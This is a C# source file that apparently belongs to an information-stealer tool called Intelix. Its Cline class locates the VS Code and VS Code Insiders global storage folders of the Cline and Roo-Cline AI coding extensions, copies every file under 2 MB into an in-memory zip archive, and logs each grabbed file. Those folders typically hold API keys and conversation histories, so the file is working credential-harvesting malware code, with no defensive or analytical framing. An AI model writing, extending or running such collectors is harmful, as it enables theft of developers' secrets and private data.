using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.AI_Agent
{
    public class Cline : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var entry = new Counter.CounterApplications { Name = "Cline" };
            string[] vscodeDirs = { "Code", "Code - Insiders" };
            string[] extIds = { "saoudrizwan.claude-dev", "rooveterinaryinc.roo-cline" };
            foreach (string vscodeDir in vscodeDirs)
            {
                foreach (string extId in extIds)
                {
                    string dir = Path.Combine(appdata, vscodeDir, "User", "globalStorage", extId);
                    if (!Directory.Exists(dir)) continue;
                    foreach (string file in Directory.GetFiles(dir, "*", SearchOption.AllDirectories))
                    {
                        if (new FileInfo(file).Length > 2 * 1024 * 1024) continue;
                        try
                        {
                            string rel = "AI-Agent\\Cline\\" + Path.GetFileName(file);
                            zip.AddFile(rel, File.ReadAllBytes(file));
                            entry.Files.Add(file + " => " + rel);
                        }
                        catch { }
                    }
                }
            }
            if (entry.Files.Count > 0) counter.AI.Add(entry);
        }
    }
}
